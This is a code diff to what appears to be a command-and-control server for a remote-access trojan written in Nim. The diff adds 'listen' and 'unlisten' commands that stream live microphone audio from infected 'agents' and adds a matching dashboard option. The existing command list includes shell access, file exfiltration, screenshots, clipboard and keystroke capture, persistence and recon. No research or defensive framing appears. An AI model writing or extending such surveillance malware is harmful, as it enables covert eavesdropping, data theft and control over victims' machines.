@@ -509,6 +509,8 @@ proc helpText(): string =
            "  upload/up <id> <remotepath> <base64>\n" &
            "  screenshot/ss <id>             - take screenshot\n" &
            "  mic/m <id> [seconds]          - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav\n" &
+           "  listen <id>                   - start live mic stream -> downloads/mic_live_<ts>.wav (ffplay -infbuf)\n" &
+           "  unlisten <id>                 - stop live mic stream and finalize file\n" &
            "  ps <id>                        - list processes on agent\n" &
            "  clip <id>                      - get clipboard\n" &
            "  find <id> <path>;<mask>        - find files\n" &
@@ -543,7 +545,7 @@ proc dispatch(line: string): string =
   of "shell", "sh", "download", "dl", "screenshot", "ss", "ps",
      "clip", "find", "keys", "k", "persist", "p", "killdate",
      "sleep", "kill", "x", "exfil", "recon", "tg", "panic",
-     "mic", "m":
+     "mic", "m", "listen", "unlisten":
     if p.len < 2: return "Usage: " & p[0] & " <id> [args]\n"
     let cmd = block:
       var c = p[0]
@@ -558,7 +560,8 @@ proc dispatch(line: string): string =
       else: c
     if cmd == "screenshot" or cmd == "persist" or cmd == "kill" or
        cmd == "panic" or
-       cmd == "ps" or cmd == "clip" or cmd == "tg":
+       cmd == "ps" or cmd == "clip" or cmd == "tg" or
+       cmd == "listen" or cmd == "unlisten":
       if p.len < 2: return "Usage: " & p[0] & " <id>\n"
       withLock agentsLock:
         if p[1] in agents:
@@ -735,6 +738,7 @@ const DASHBOARD_HTML = """
         <option>clip</option>
         <option>screenshot</option>
         <option>mic</option>
+        <option>listen</option>
         <option>find</option>
         <option>persist</option>
         <option>kill</option>
